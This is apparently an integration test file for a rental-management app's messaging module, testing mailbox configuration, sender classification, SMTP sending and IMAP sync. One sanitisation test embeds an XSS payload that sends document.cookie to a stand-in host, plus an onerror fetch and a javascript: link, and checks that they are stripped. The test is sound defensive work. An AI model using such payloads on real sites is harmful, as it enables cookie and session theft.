import { randomUUID } from "crypto";
import { mkdir, rm } from "fs/promises";
import os from "os";
import path from "path";
import { BadGatewayException, BadRequestException } from "@nestjs/common";
import { ConfigModule } from "@nestjs/config";
import { Test, type TestingModule } from "@nestjs/testing";
import {
  boiteMailDediee,
  candidat,
  contact,
  createDbClient,
  DEFAULT_DEV_DATABASE_URL,
  documents,
  locataires,
  messageCommunication,
  organisations,
  pieceJointeMessage,
  utilisateurs,
  type Database
} from "db";
import { eq } from "drizzle-orm";
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { AppartementsModule } from "../appartements/appartements.module";
import { AppartementsService } from "../appartements/appartements.service";
import { AuditModule } from "../audit/audit.module";
import { AuthModule } from "../auth/auth.module";
import { BauxModule } from "../baux/baux.module";
import { BauxService } from "../baux/baux.service";
import { BienModule } from "../bien/bien.module";
import { BienService } from "../bien/bien.service";
import { CommonModule } from "../common/common.module";
import { RequestContextService } from "../common/request-context";
import { EncryptionModule } from "../crypto/encryption.module";
import { DATABASE_CONNECTION, DatabaseModule } from "../database/database.module";
import { DocumentsModule } from "../documents/documents.module";
import { GarantsModule } from "../garants/garants.module";
import { GarantsService } from "../garants/garants.service";
import { ScisModule } from "../scis/scis.module";
import { ScisService } from "../scis/scis.service";
import { createTransactionalTestHooks } from "../test-utils/transactional-test";
import { UsersModule } from "../users/users.module";
import { BoiteMailDedieeService } from "./boite-mail-dediee.service";
import { BoiteMailNonConfigureeException } from "./boite-mail-non-configuree.exception";
import { ClassificationMessageService } from "./classification-message.service";
import { ImapSyncJobService } from "./imap-sync-job.service";
import { MessagerieModule } from "./messagerie.module";
import { MessagesCommunicationService } from "./messages-communication.service";
import { SmtpEnvoiService } from "./smtp-envoi.service";

// nodemailer/imapflow font de vrais appels réseau (SMTP/IMAP Gmail) — jamais
// dans les tests automatisés (même consigne que fetch pour GoogleOAuthService,
// voir google-oauth.service.integration.spec.ts). Mockés au niveau du module,
// seule option viable pour ces deux bibliothèques (contrairement à fetch,
// leur API n'est pas un simple appel réseau substituable en une ligne).
const sendMailMock = vi.hoisted(() => vi.fn());
vi.mock("nodemailer", () => ({
  default: { createTransport: vi.fn(() => ({ sendMail: sendMailMock })) }
}));

interface FausseImapFlowInstance {
  connect: ReturnType<typeof vi.fn>;
  logout: ReturnType<typeof vi.fn>;
  getMailboxLock: ReturnType<typeof vi.fn>;
  fetch: ReturnType<typeof vi.fn>;
}

const { imapFlowConstructeurMock, imapFlowInstances, messagesImapAFournir } = vi.hoisted(() => {
  return {
    imapFlowConstructeurMock: vi.fn(),
    imapFlowInstances: [] as FausseImapFlowInstance[],
    messagesImapAFournir: { valeur: [] as { uid: number; source: Buffer }[] }
  };
});

vi.mock("imapflow", () => {
  class ImapFlow {
    constructor(options: unknown) {
      imapFlowConstructeurMock(options);
      const instance: FausseImapFlowInstance = {
        connect: vi.fn(async () => undefined),
        logout: vi.fn(async () => undefined),
        getMailboxLock: vi.fn(async () => ({ release: vi.fn() })),
        fetch: vi.fn(function fetchMock(range: string) {
          const seuil = Number(range.split(":")[0]);
          const messages = messagesImapAFournir.valeur.filter((m) => m.uid >= seuil);
          return (async function* generateur() {
            for (const message of messages) {
              yield message;
            }
          })();
        })
      };
      imapFlowInstances.push(instance);
      Object.assign(this, instance);
    }
  }
  return { ImapFlow };
});

function construireEmailBrut(input: {
  from: string;
  to: string;
  subject: string;
  date: string;
  messageId: string;
  corps: string;
}): Buffer {
  return Buffer.from(
    [
      `From: ${input.from}`,
      `To: ${input.to}`,
      `Subject: ${input.subject}`,
      `Date: ${input.date}`,
      `Message-ID: ${input.messageId}`,
      "MIME-Version: 1.0",
      "Content-Type: text/plain; charset=utf-8",
      "",
      input.corps
    ].join("\r\n")
  );
}

// multipart/alternative avec une partie HTML (contenu potentiellement
// malveillant, jamais fiable) et, optionnellement, une partie texte —
// sert à vérifier que ImapSyncJobService sépare bien corpsTexte/corpsHtml
// et nettoie ce dernier (audit préalable, 2026-09-16).
function construireEmailHtml(input: {
  from: string;
  to: string;
  subject: string;
  date: string;
  messageId: string;
  corpsHtml: string;
  corpsTexte?: string;
}): Buffer {
  const boundary = "----test-boundary-messagerie-html----";
  const lignes = [
    `From: ${input.from}`,
    `To: ${input.to}`,
    `Subject: ${input.subject}`,
    `Date: ${input.date}`,
    `Message-ID: ${input.messageId}`,
    "MIME-Version: 1.0",
    `Content-Type: multipart/alternative; boundary="${boundary}"`,
    ""
  ];
  if (input.corpsTexte !== undefined) {
    lignes.push(`--${boundary}`, "Content-Type: text/plain; charset=utf-8", "", input.corpsTexte);
  }
  lignes.push(`--${boundary}`, "Content-Type: text/html; charset=utf-8", "", input.corpsHtml, `--${boundary}--`, "");
  return Buffer.from(lignes.join("\r\n"));
}

function construireEmailAvecPieceJointe(input: {
  from: string;
  to: string;
  subject: string;
  date: string;
  messageId: string;
  corps: string;
  nomFichierPieceJointe: string;
  contenuPieceJointe: Buffer;
}): Buffer {
  const boundary = "----test-boundary-messagerie----";
  return Buffer.from(
    [
      `From: ${input.from}`,
      `To: ${input.to}`,
      `Subject: ${input.subject}`,
      `Date: ${input.date}`,
      `Message-ID: ${input.messageId}`,
      "MIME-Version: 1.0",
      `Content-Type: multipart/mixed; boundary="${boundary}"`,
      "",
      `--${boundary}`,
      "Content-Type: text/plain; charset=utf-8",
      "",
      input.corps,
      "",
      `--${boundary}`,
      `Content-Type: application/pdf; name="${input.nomFichierPieceJointe}"`,
      `Content-Disposition: attachment; filename="${input.nomFichierPieceJointe}"`,
      "Content-Transfer-Encoding: base64",
      "",
      input.contenuPieceJointe.toString("base64"),
      "",
      `--${boundary}--`,
      ""
    ].join("\r\n")
  );
}

describe("Module Messagerie (intégration Postgres réelle, SMTP/IMAP mockés)", () => {
  const rootDb = createDbClient(process.env["DATABASE_URL"] ?? DEFAULT_DEV_DATABASE_URL);
  const { begin, rollback } = createTransactionalTestHooks(rootDb);
  const storageDirTest = path.join(os.tmpdir(), `appli-immo-test-messagerie-${randomUUID()}`);
  process.env["DOCUMENTS_STORAGE_DIR"] = storageDirTest;

  let moduleRef: TestingModule;
  let boiteMailDedieeService: BoiteMailDedieeService;
  let classificationMessageService: ClassificationMessageService;
  let smtpEnvoiService: SmtpEnvoiService;
  let imapSyncJobService: ImapSyncJobService;
  let messagesCommunicationService: MessagesCommunicationService;
  let requestContextService: RequestContextService;
  let scisService: ScisService;
  let bienService: BienService;
  let appartementsService: AppartementsService;
  let bauxService: BauxService;
  let garantsService: GarantsService;
  let db: Database;
  let organisationId: string;
  let userId: string;

  beforeEach(async () => {
    db = await begin();
    sendMailMock.mockReset();
    sendMailMock.mockResolvedValue(undefined);
    imapFlowConstructeurMock.mockClear();
    imapFlowInstances.length = 0;
    messagesImapAFournir.valeur = [];
    await mkdir(storageDirTest, { recursive: true });

    moduleRef = await Test.createTestingModule({
      imports: [
        ConfigModule.forRoot({ isGlobal: true }),
        CommonModule,
        DatabaseModule,
        EncryptionModule,
        AuditModule,
        UsersModule,
        AuthModule,
        DocumentsModule,
        ScisModule,
        BienModule,
        AppartementsModule,
        BauxModule,
        GarantsModule,
        MessagerieModule
      ]
    })
      .overrideProvider(DATABASE_CONNECTION)
      .useValue(db)
      .compile();

    boiteMailDedieeService = moduleRef.get(BoiteMailDedieeService);
    classificationMessageService = moduleRef.get(ClassificationMessageService);
    smtpEnvoiService = moduleRef.get(SmtpEnvoiService);
    imapSyncJobService = moduleRef.get(ImapSyncJobService);
    messagesCommunicationService = moduleRef.get(MessagesCommunicationService);
    requestContextService = moduleRef.get(RequestContextService);
    scisService = moduleRef.get(ScisService);
    bienService = moduleRef.get(BienService);
    appartementsService = moduleRef.get(AppartementsService);
    bauxService = moduleRef.get(BauxService);
    garantsService = moduleRef.get(GarantsService);

    const [organisation] = await db
      .insert(organisations)
      .values({ type: "particulier", nom: "Organisation Messagerie Intégration" })
      .returning();
    if (!organisation) throw new Error("Échec de l'insertion de l'organisation de test");
    organisationId = organisation.id;
    const [user] = await db
      .insert(utilisateurs)
      .values({
        organisationId,
        email: `messagerie-integration-${randomUUID()}@example.com`,
        nom: "Test",
        prenom: "Messagerie",
        motDePasseHash: "peu-importe-pour-ce-test",
        statut: "actif"
      })
      .returning();
    if (!user) throw new Error("Échec de l'insertion de l'utilisateur de test");
    userId = user.id;
  });

  afterEach(async () => {
    await moduleRef?.close();
    await rollback();
  });

  afterAll(async () => {
    await rootDb.$client.end();
    await rm(storageDirTest, { recursive: true, force: true });
  });

  async function configurerBoite(email = "boite-dediee@example.com"): Promise<void> {
    await boiteMailDedieeService.configurer(userId, { email, motDePasseApp: "abcdefghijklmnop" });
  }

  // Chaîne minimale SCI -> bien -> appartement -> bail, requise par la
  // contrainte de clé étrangère garants.bail_id (jamais de garant orphelin,
  // voir packages/db/src/schema/garants.ts) — même construction que
  // contacts.integration.spec.ts pour le même besoin.
  async function creerGarantDeTest(email: string): Promise<{ id: string }> {
    const sci = await scisService.create(userId, {
      nom: "SCI Messagerie Test",
      regimeFiscal: "IR",
      adresse: "1 rue de Test",
      codePostal: "75001",
      ville: "Paris"
    });
    const bien = await bienService.create(userId, {
      type: "immeuble",
      proprietaireType: "sci",
      sciId: sci.id,
      nom: "Immeuble Messagerie Test",
      adresse: "1 rue Messagerie",
      codePostal: "75001",
      ville: "Paris",
      typeHabitat: "collectif",
      regimeJuridique: "copropriete"
    });
    const appartement = await appartementsService.create({
      bienId: bien.id,
      numero: "1",
      type: "T2",
      nombrePiecesPrincipales: 3,
      modeChauffage: "individuel",
      modeEauChaude: "individuel",
      loyerReference: "800.00"
    });
    const bail = await bauxService.create({
      appartementId: appartement.id,
      typeBail: "vide",
      dateDebut: "2026-08-01",
      jourEcheance: 5
    });
    return garantsService.create({
      bailId: bail.id,
      nom: "Durand",
      prenom: "Claire",
      email,
      typeGarantie: "personne_physique"
    });
  }

  describe("BoiteMailDedieeService", () => {
    it("obtenirStatut : non configurée par défaut", async () => {
      expect(await boiteMailDedieeService.obtenirStatut(userId)).toEqual({ configuree: false, email: null });
    });

    it("configurer puis obtenirStatut : reflète l'email en clair, jamais le mot de passe", async () => {
      const statut = await boiteMailDedieeService.configurer(userId, {
        email: "boite-dediee@example.com",
        motDePasseApp: "abcdefghijklmnop"
      });
      expect(statut).toEqual({ configuree: true, email: "boite-dediee@example.com" });
      expect(await boiteMailDedieeService.obtenirStatut(userId)).toEqual({
        configuree: true,
        email: "boite-dediee@example.com"
      });
    });

    it("une reconfiguration archive l'ancienne ligne plutôt que de la modifier en place", async () => {
      await configurerBoite("premiere@example.com");
      const [premiere] = await db
        .select()
        .from(boiteMailDediee)
        .where(eq(boiteMailDediee.organisationId, organisationId));
      await boiteMailDedieeService.configurer(userId, { email: "seconde@example.com", motDePasseApp: "abcdefghijklmnop" });

      const toutes = await db.select().from(boiteMailDediee).where(eq(boiteMailDediee.organisationId, organisationId));
      expect(toutes).toHaveLength(2);
      expect(toutes.find((l) => l.id === premiere?.id)?.archivedAt).not.toBeNull();
      const active = toutes.find((l) => l.archivedAt === null);
      expect(active?.email).toBe("seconde@example.com");
    });

    it("obtenirIdentifiants : mot de passe déchiffré correctement, jamais stocké en clair", async () => {
      await configurerBoite();
      const [ligne] = await db.select().from(boiteMailDediee).where(eq(boiteMailDediee.organisationId, organisationId));
      expect(ligne?.motDePasseAppChiffre).not.toBe("abcdefghijklmnop");

      const identifiants = await boiteMailDedieeService.obtenirIdentifiants(organisationId);
      expect(identifiants).toEqual({ email: "boite-dediee@example.com", motDePasseApp: "abcdefghijklmnop" });
    });

    it("obtenirIdentifiants rejette avec BoiteMailNonConfigureeException si aucune boîte active", async () => {
      await expect(boiteMailDedieeService.obtenirIdentifiants(organisationId)).rejects.toThrow(
        BoiteMailNonConfigureeException
      );
    });

    it("mettreAJourDernierUidSynchronise met à jour la ligne active en place", async () => {
      await configurerBoite();
      const boite = await boiteMailDedieeService.trouverActive(organisationId);
      if (!boite) throw new Error("Boîte attendue introuvable");

      await boiteMailDedieeService.mettreAJourDernierUidSynchronise(boite.id, 42);

      const apres = await boiteMailDedieeService.trouverActive(organisationId);
      expect(apres?.dernierUidSynchronise).toBe(42);
      expect(apres?.id).toBe(boite.id);
    });
  });

  describe("ClassificationMessageService", () => {
    it("classe sur un contact quand une seule correspondance existe", async () => {
      const [c] = await db
        .insert(contact)
        .values({ nom: "Assurup", typeEntite: "entreprise", role: "assureur", email: "assurup@example.com", organisationId })
        .returning();
      if (!c) throw new Error("Échec de l'insertion du contact de test");

      const resultat = await classificationMessageService.resoudre("assurup@example.com", organisationId);
      expect(resultat).toEqual({ type: "contact", id: c.id });
    });

    it("classe sur un locataire quand une seule correspondance existe", async () => {
      const [l] = await db
        .insert(locataires)
        .values({ nom: "Devos", prenom: "Ilan", email: "ilan.devos@example.com", organisationId })
        .returning();
      if (!l) throw new Error("Échec de l'insertion du locataire de test");

      const resultat = await classificationMessageService.resoudre("ilan.devos@example.com", organisationId);
      expect(resultat).toEqual({ type: "locataire", id: l.id });
    });

    it("classe sur un candidat quand une seule correspondance existe", async () => {
      const [cand] = await db
        .insert(candidat)
        .values({ nom: "Martin", email: "martin.candidat@example.com", organisationId })
        .returning();
      if (!cand) throw new Error("Échec de l'insertion du candidat de test");

      const resultat = await classificationMessageService.resoudre("martin.candidat@example.com", organisationId);
      expect(resultat).toEqual({ type: "candidat", id: cand.id });
    });

    it("classe sur un garant quand une seule correspondance existe", async () => {
      const garant = await creerGarantDeTest("claire.durand@example.com");

      const resultat = await classificationMessageService.resoudre("claire.durand@example.com", organisationId);
      expect(resultat).toEqual({ type: "garant", id: garant.id });
    });

    it("reste non_classe quand aucune correspondance", async () => {
      const resultat = await classificationMessageService.resoudre("inconnu@example.com", organisationId);
      expect(resultat).toEqual({ type: "non_classe", id: null });
    });

    it("reste non_classe quand deux entités distinctes partagent la même adresse — jamais de choix arbitraire", async () => {
      await db
        .insert(contact)
        .values({ nom: "Doublon", typeEntite: "personne_physique", role: "autre", email: "partage@example.com", organisationId });
      await db.insert(locataires).values({ nom: "Doublon", prenom: "Aussi", email: "partage@example.com", organisationId });

      const resultat = await classificationMessageService.resoudre("partage@example.com", organisationId);
      expect(resultat).toEqual({ type: "non_classe", id: null });
    });

    it("scope par organisation : une correspondance dans une autre organisation n'est jamais prise en compte", async () => {
      const [autreOrganisation] = await db
        .insert(organisations)
        .values({ type: "particulier", nom: "Autre organisation Messagerie" })
        .returning();
      if (!autreOrganisation) throw new Error("Échec de l'insertion de l'autre organisation");
      await db
        .insert(locataires)
        .values({ nom: "Autre", prenom: "Org", email: "isole@example.com", organisationId: autreOrganisation.id });

      const resultat = await classificationMessageService.resoudre("isole@example.com", organisationId);
      expect(resultat).toEqual({ type: "non_classe", id: null });
    });
  });

  describe("SmtpEnvoiService", () => {
    it("envoie via nodemailer avec les identifiants de la boîte dédiée et journalise le message envoyé", async () => {
      await configurerBoite();
      const [locataire] = await db
        .insert(locataires)
        .values({ nom: "Devos", prenom: "Ilan", email: "ilan.devos@example.com", organisationId })
        .returning();
      if (!locataire) throw new Error("Échec de l'insertion du locataire de test");

      const messageId = await smtpEnvoiService.envoyerEmail(
        organisationId,
        "ilan.devos@example.com",
        "Rappel de loyer",
        "Bonjour Ilan, votre loyer est en retard."
      );

      expect(sendMailMock).toHaveBeenCalledWith(
        expect.objectContaining({
          from: "boite-dediee@example.com",
          to: "ilan.devos@example.com",
          subject: "Rappel de loyer",
          text: "Bonjour Ilan, votre loyer est en retard."
        })
      );

      const [ligne] = await db.select().from(messageCommunication).where(eq(messageCommunication.id, messageId));
      expect(ligne?.direction).toBe("envoye");
      expect(ligne?.emailExpediteur).toBe("boite-dediee@example.com");
      expect(ligne?.emailDestinataire).toBe("ilan.devos@example.com");
      expect(ligne?.classificationType).toBe("locataire");
      expect(ligne?.classificationId).toBe(locataire.id);
      expect(ligne?.imapMessageId).toBeNull();
    });

    it("joint la pièce jointe transmise à nodemailer et la journalise dans piece_jointe_message", async () => {
      await configurerBoite();
      const contenu = Buffer.from("%PDF-1.4 contenu de quittance de test");

      const messageId = await smtpEnvoiService.envoyerEmail(
        organisationId,
        "destinataire-inconnu@example.com",
        "Quittance",
        "Voici votre quittance.",
        { nomFichier: "quittance.docx", contenu, mimeType: "application/pdf" }
      );

      expect(sendMailMock).toHaveBeenCalledWith(
        expect.objectContaining({
          attachments: [{ filename: "quittance.docx", content: contenu, contentType: "application/pdf" }]
        })
      );
      const [piece] = await db.select().from(pieceJointeMessage).where(eq(pieceJointeMessage.messageId, messageId));
      expect(piece?.nomFichier).toBe("quittance.docx");
      expect(piece?.typeMime).toBe("application/pdf");
    });

    it("rejette avec BoiteMailNonConfigureeException si aucune boîte configurée, jamais d'appel à nodemailer", async () => {
      await expect(
        smtpEnvoiService.envoyerEmail(organisationId, "x@example.com", "Objet", "Corps")
      ).rejects.toThrow(BoiteMailNonConfigureeException);
      expect(sendMailMock).not.toHaveBeenCalled();
    });

    it("un échec SMTP lève BadGatewayException, jamais de ligne message_communication créée", async () => {
      await configurerBoite();
      sendMailMock.mockRejectedValueOnce(new Error("Connexion SMTP refusée"));

      await expect(
        smtpEnvoiService.envoyerEmail(organisationId, "x@example.com", "Objet", "Corps")
      ).rejects.toThrow(BadGatewayException);

      const toutes = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
      expect(toutes).toHaveLength(0);
    });
  });

  describe("ImapSyncJobService", () => {
    it("importe un message reçu, résout la classification depuis l'expéditeur, avance dernierUidSynchronise", async () => {
      await configurerBoite();
      const [locataire] = await db
        .insert(locataires)
        .values({ nom: "Devos", prenom: "Ilan", email: "ilan.devos@example.com", organisationId })
        .returning();
      if (!locataire) throw new Error("Échec de l'insertion du locataire de test");

      messagesImapAFournir.valeur = [
        {
          uid: 5,
          source: construireEmailBrut({
            from: "Ilan Devos <ilan.devos@example.com>",
            to: "boite-dediee@example.com",
            subject: "Question sur le bail",
            date: "Mon, 01 Sep 2026 10:00:00 +0200",
            messageId: "<msg-1@example.com>",
            corps: "Avez-vous reçu mon virement ?"
          })
        }
      ];

      const boite = await boiteMailDedieeService.trouverActive(organisationId);
      if (!boite) throw new Error("Boîte attendue introuvable");
      const nombreImportes = await imapSyncJobService.synchroniserBoite(boite);

      expect(nombreImportes).toBe(1);
      const [ligne] = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
      expect(ligne?.direction).toBe("recu");
      expect(ligne?.objet).toBe("Question sur le bail");
      expect(ligne?.emailExpediteur).toBe("ilan.devos@example.com");
      expect(ligne?.classificationType).toBe("locataire");
      expect(ligne?.classificationId).toBe(locataire.id);
      expect(ligne?.imapMessageId).toBe("<msg-1@example.com>");

      const apres = await boiteMailDedieeService.trouverActive(organisationId);
      expect(apres?.dernierUidSynchronise).toBe(5);
    });

    // Audit préalable, 2026-09-16 : mailparser expose parsed.text et
    // parsed.html séparément — ImapSyncJobService doit les stocker chacun
    // dans sa propre colonne (corpsTexte/corpsHtml), jamais l'un écrasé
    // par l'autre.
    it("un message text/plain seul remplit corpsTexte, laisse corpsHtml null", async () => {
      await configurerBoite();
      messagesImapAFournir.valeur = [
        {
          uid: 1,
          source: construireEmailBrut({
            from: "inconnu@example.com",
            to: "boite-dediee@example.com",
            subject: "Message texte seul",
            date: "Mon, 01 Sep 2026 10:00:00 +0200",
            messageId: "<msg-texte-seul@example.com>",
            corps: "Un simple message texte."
          })
        }
      ];
      const boite = await boiteMailDedieeService.trouverActive(organisationId);
      if (!boite) throw new Error("Boîte attendue introuvable");
      await imapSyncJobService.synchroniserBoite(boite);

      const [ligne] = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
      expect(ligne?.corpsTexte).toBe("Un simple message texte.");
      expect(ligne?.corpsHtml).toBeNull();
    });

    it("un message HTML malveillant est nettoyé avant stockage — script/onerror/javascript: supprimés, mise en forme conservée", async () => {
      await configurerBoite();
      messagesImapAFournir.valeur = [
        {
          uid: 1,
          source: construireEmailHtml({
            from: "inconnu@example.com",
            to: "boite-dediee@example.com",
            subject: "Message HTML malveillant",
            date: "Mon, 01 Sep 2026 10:00:00 +0200",
            messageId: "<msg-html-malveillant@example.com>",
            corpsHtml:
              '<p>Bonjour <b>Jimmy</b>, <a href="https://example.com/quittance">voici votre quittance</a>.</p>' +
              '<script>fetch("https://malveillant.example.com/vol?c=" + document.cookie)</script>' +
              '<img src="x" onerror="fetch(\'https://malveillant.example.com/pixel\')" />' +
              '<a href="javascript:alert(1)">cliquez ici</a>'
          })
        }
      ];
      const boite = await boiteMailDedieeService.trouverActive(organisationId);
      if (!boite) throw new Error("Boîte attendue introuvable");
      await imapSyncJobService.synchroniserBoite(boite);

      const [ligne] = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
      // Aucune trace du contenu dangereux, sous quelque forme que ce soit.
      expect(ligne?.corpsHtml).not.toContain("<script");
      expect(ligne?.corpsHtml).not.toContain("onerror");
      expect(ligne?.corpsHtml).not.toContain("javascript:");
      expect(ligne?.corpsHtml).not.toContain("malveillant.example.com");
      expect(ligne?.corpsHtml).not.toContain("<img");
      // Mise en forme légitime conservée : gras + lien http(s).
      expect(ligne?.corpsHtml).toContain("<b>Jimmy</b>");
      expect(ligne?.corpsHtml).toContain('href="https://example.com/quittance"');
      expect(ligne?.corpsTexte).toBeNull();
    });

    it("un message multipart/alternative garde corpsTexte ET corpsHtml séparément (HTML nettoyé)", async () => {
      await configurerBoite();
      messagesImapAFournir.valeur = [
        {
          uid: 1,
          source: construireEmailHtml({
            from: "inconnu@example.com",
            to: "boite-dediee@example.com",
            subject: "Message texte + HTML",
            date: "Mon, 01 Sep 2026 10:00:00 +0200",
            messageId: "<msg-texte-et-html@example.com>",
            corpsTexte: "Version texte brut.",
            corpsHtml: "<p>Version <em>HTML</em>.</p><script>alert(1)</script>"
          })
        }
      ];
      const boite = await boiteMailDedieeService.trouverActive(organisationId);
      if (!boite) throw new Error("Boîte attendue introuvable");
      await imapSyncJobService.synchroniserBoite(boite);

      const [ligne] = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
      expect(ligne?.corpsTexte).toBe("Version texte brut.");
      expect(ligne?.corpsHtml).toContain("<em>HTML</em>");
      expect(ligne?.corpsHtml).not.toContain("<script");
    });

    it("classe un message reçu d'un garant — symétrique à la classification à l'envoi (fil unifié)", async () => {
      await configurerBoite();
      const garant = await creerGarantDeTest("claire.durand@example.com");

      messagesImapAFournir.valeur = [
        {
          uid: 1,
          source: construireEmailBrut({
            from: "Claire Durand <claire.durand@example.com>",
            to: "boite-dediee@example.com",
            subject: "Réponse au sujet du dossier",
            date: "Mon, 01 Sep 2026 10:00:00 +0200",
            messageId: "<msg-garant@example.com>",
            corps: "Voici ma réponse."
          })
        }
      ];

      const boite = await boiteMailDedieeService.trouverActive(organisationId);
      if (!boite) throw new Error("Boîte attendue introuvable");
      await imapSyncJobService.synchroniserBoite(boite);

      const [ligne] = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
      expect(ligne?.classificationType).toBe("garant");
      expect(ligne?.classificationId).toBe(garant.id);
    });

    it("stocke les pièces jointes d'un message reçu sans jamais créer de ligne documents", async () => {
      await configurerBoite();
      const contenuPieceJointe = Buffer.from("%PDF-1.4 rapport d'expertise de test");
      messagesImapAFournir.valeur = [
        {
          uid: 1,
          source: construireEmailAvecPieceJointe({
            from: "Assurup <assurup@example.com>",
            to: "boite-dediee@example.com",
            subject: "Rapport d'expertise",
            date: "Tue, 02 Sep 2026 09:00:00 +0200",
            messageId: "<msg-2@example.com>",
            corps: "Voici le rapport.",
            nomFichierPieceJointe: "rapport.pdf",
            contenuPieceJointe
          })
        }
      ];

      // Nombre de documents avant/après plutôt qu'un compte absolu : la base
      // de dev partagée peut déjà porter des lignes `documents` réelles
      // issues d'autres fixtures (bail-document-docx, état des lieux...),
      // même transaction isolée ou non — seul l'écart importe ici.
      const nombreDocumentsAvant = (await db.select().from(documents)).length;

      const boite = await boiteMailDedieeService.trouverActive(organisationId);
      if (!boite) throw new Error("Boîte attendue introuvable");
      await imapSyncJobService.synchroniserBoite(boite);

      const [ligne] = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
      const piecesJointes = await db.select().from(pieceJointeMessage).where(eq(pieceJointeMessage.messageId, ligne!.id));
      expect(piecesJointes).toHaveLength(1);
      expect(piecesJointes[0]?.nomFichier).toBe("rapport.pdf");
      const nombreDocumentsApres = (await db.select().from(documents)).length;
      expect(nombreDocumentsApres).toBe(nombreDocumentsAvant);
    });

    it("est idempotent : une seconde synchronisation ne réimporte jamais le même message (dédoublonnage par imapMessageId)", async () => {
      await configurerBoite();
      messagesImapAFournir.valeur = [
        {
          uid: 1,
          source: construireEmailBrut({
            from: "inconnu@example.com",
            to: "boite-dediee@example.com",
            subject: "Premier message",
            date: "Mon, 01 Sep 2026 10:00:00 +0200",
            messageId: "<msg-unique@example.com>",
            corps: "Contenu"
          })
        }
      ];
      const boite = await boiteMailDedieeService.trouverActive(organisationId);
      if (!boite) throw new Error("Boîte attendue introuvable");

      const premierPassage = await imapSyncJobService.synchroniserBoite(boite);
      // Deuxième appel avec dernierUidSynchronise déjà avancé à 1 : le range
      // demandé au serveur (2:*) exclut déjà le message — même mécanisme
      // que la vraie boîte, le dédoublonnage par imapMessageId reste une
      // seconde barrière si jamais le même UID était re-fourni.
      const boiteApres = await boiteMailDedieeService.trouverActive(organisationId);
      const deuxiemePassage = await imapSyncJobService.synchroniserBoite(boiteApres!);

      expect(premierPassage).toBe(1);
      expect(deuxiemePassage).toBe(0);
      const toutes = await db.select().from(messageCommunication).where(eq(messageCommunication.organisationId, organisationId));
      expect(toutes).toHaveLength(1);
    });

    it("synchroniserToutesLesBoites traite chaque organisation indépendamment, une boîte en échec n'empêche pas les autres", async () => {
      await configurerBoite("boite-org-1@example.com");
      const [autreOrganisation] = await db
        .insert(organisations)
        .values({ type: "particulier", nom: "Autre organisation Messagerie Sync" })
        .returning();
      if (!autreOrganisation) throw new Error("Échec de l'insertion de l'autre organisation");
      const [autreUser] = await db
        .insert(utilisateurs)
        .values({
          organisationId: autreOrganisation.id,
          email: `messagerie-integration-autre-${randomUUID()}@example.com`,
          nom: "Test",
          prenom: "Autre",
          motDePasseHash: "peu-importe-pour-ce-test",
          statut: "actif"
        })
        .returning();
      if (!autreUser) throw new Error("Échec de l'insertion de l'autre utilisateur");
      await boiteMailDedieeService.configurer(autreUser.id, {
        email: "boite-org-2@example.com",
        motDePasseApp: "abcdefghijklmnop"
      });

      messagesImapAFournir.valeur = [
        {
          uid: 1,
          source: construireEmailBrut({
            from: "quelquun@example.com",
            to: "boite-org-1@example.com",
            subject: "Message pour org 1 ou 2",
            date: "Mon, 01 Sep 2026 10:00:00 +0200",
            messageId: "<msg-multi-org@example.com>",
            corps: "Contenu"
          })
        }
      ];

      const total = await imapSyncJobService.synchroniserToutesLesBoites();

      // Chaque organisation reçoit sa propre synchronisation (même liste de
      // messages fournie par le double, imapMessageId différent au niveau
      // applicatif n'étant pas le sujet ici) — l'important est qu'aucune
      // exception dans une organisation ne bloque les autres.
      expect(total).toBeGreaterThanOrEqual(1);
    });
  });

  describe("MessagesCommunicationService", () => {
    it("findAll filtre par classificationType/classificationId", async () => {
      const [locataire] = await db
        .insert(locataires)
        .values({ nom: "Devos", prenom: "Ilan", email: "ilan.devos@example.com", organisationId })
        .returning();
      if (!locataire) throw new Error("Échec de l'insertion du locataire de test");
      await db.insert(messageCommunication).values({
        direction: "recu",
        emailExpediteur: "ilan.devos@example.com",
        emailDestinataire: "boite@example.com",
        dateMessage: new Date(),
        classificationType: "locataire",
        classificationId: locataire.id,
        organisationId
      });
      await db.insert(messageCommunication).values({
        direction: "recu",
        emailExpediteur: "inconnu@example.com",
        emailDestinataire: "boite@example.com",
        dateMessage: new Date(),
        classificationType: "non_classe",
        organisationId
      });

      const resultats = await requestContextService.executerAvecContexte({ utilisateurId: userId }, () =>
        messagesCommunicationService.findAll({ classificationType: "locataire", classificationId: locataire.id })
      );
      expect(resultats).toHaveLength(1);
      expect(resultats[0]?.classificationId).toBe(locataire.id);
    });

    it("findById inclut les pièces jointes", async () => {
      const [ligne] = await db
        .insert(messageCommunication)
        .values({
          direction: "recu",
          emailExpediteur: "x@example.com",
          emailDestinataire: "boite@example.com",
          dateMessage: new Date(),
          organisationId
        })
        .returning();
      if (!ligne) throw new Error("Échec de l'insertion du message de test");
      await db.insert(pieceJointeMessage).values({
        messageId: ligne.id,
        nomFichier: "photo.jpg",
        cheminStockage: "messages/x/y.enc",
        typeMime: "image/jpeg",
        organisationId
      });

      const resultat = await messagesCommunicationService.findById(ligne.id);
      expect(resultat?.piecesJointes).toHaveLength(1);
      expect(resultat?.piecesJointes[0]?.nomFichier).toBe("photo.jpg");
    });

    it("composer délègue à SmtpEnvoiService et renvoie le message créé", async () => {
      await configurerBoite();

      const resultat = await messagesCommunicationService.composer(userId, {
        destinataire: "quelquun@example.com",
        objet: "Bonjour",
        corps: "Message de test"
      });

      expect(sendMailMock).toHaveBeenCalledTimes(1);
      expect(resultat?.direction).toBe("envoye");
      expect(resultat?.objet).toBe("Bonjour");
    });

    // Sélecteur de destinataire depuis le Carnet de contacts (desktop,
    // 2026-09-16) : classificationType/classificationId fournis explicitement
    // court-circuitent la résolution automatique par adresse email — même
    // avec une adresse qui n'a AUCUNE correspondance en base (la résolution
    // automatique aurait renvoyé non_classe), la classification demandée est
    // bien celle appliquée.
    it("composer applique la classification fournie explicitement, sans attendre de correspondance d'adresse", async () => {
      await configurerBoite();
      const garant = await creerGarantDeTest("autre-adresse-que-celle-du-garant@example.com");

